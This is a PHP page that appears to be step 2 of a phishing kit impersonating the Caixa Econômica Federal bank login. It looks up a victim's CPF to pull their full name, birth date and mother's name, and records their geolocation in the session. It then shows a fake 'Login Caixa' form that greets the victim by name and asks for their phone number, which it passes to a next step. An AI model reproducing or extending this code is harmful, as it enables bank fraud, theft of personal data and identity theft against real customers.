<?php
//TELEFONE
 session_start();
    include('funcoes.php');
    if(isset($_POST['cpf'])){
        $cpf = limpa_cpf_cnpj($_POST['cpf']);
        $response = getData($cpf);
        $json = json_decode($response);
        $status = $json->status;
        if($status == false){
            $_SESSION['erro'] = 'cpf';
            header("location: step-1.php");
        }else{
            $dataNascimento = getDataNascimento($json);
            $dia = substr($dataNascimento[2],0,2);
            $mes = $dataNascimento[1];
            $ano = $dataNascimento[0];
            $nomedamae = $json->result->NOME_MAE;
            $nome = $json->result->NOME;
            $primeiroNome = explode(" ",$nome);
            $_SESSION['erro'] = 'off';

            //INFO
            $_SESSION['lat'] = $_POST['lat'];
            $_SESSION['long'] = $_POST['long'];
            $_SESSION['primeiro_nome'] = $primeiroNome[0];
            $_SESSION['nomecompleto'] = $nome;
            $_SESSION['cpf'] = $json->result->CPF;
        }
    }   
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Caixa Economica</title>

    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <link rel="stylesheet" href="<?=PATH?>css/default.css">
</head>
<body>
    <main class="bg">
        <div class="box">
            <div class="header-box">
                <div class="title-box">
                    <img src="<?=PATH?>images/logo_caixa.png" height="30px;" alt="">
                    <p>Login Caixa</p>
                </div>
            </div> 
            <br>
            <div class="content-box">
                <h3>Olá, <?=$_SESSION['primeiro_nome']?></h3>
                <p>Confirme o número do seu telefone:</p>
                <br>
                <p style="font-size: 0.8rem;"><i class="fa-solid fa-phone"></i> Telefone</p>
                <form action="<?=PATH?>step-3" method="POST">
                    <div>
                        <input class="phone_with_ddd" name="tel" type="text" autocomplete="off" required>
                    </div>
                    <br>
                    <input class="btn-submit" type="submit" value="Entrar">
                </form>
            </div>
            <div class="footer-box">
                <p><span><i class="fa-solid fa-question"></i></span><u>Preciso de ajuda</u></p>
            </div>
        </div>
    </main>

<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="<?=PATH?>js/jquery.mask.js"></script>

<script>
    $(document).ready(function(){
        $('.phone_with_ddd').mask('(00) 0000-0000');
        $('.cep').mask('00000-000');
        $('.cpf').mask('000.000.000-00', {reverse: true});
        $('.date').mask('00/00/0000');
        $('.senha').mask('00000000');
        $('.phone_with_ddd').mask('(00) 00000-0000');

    })
</script>
</body>
</html>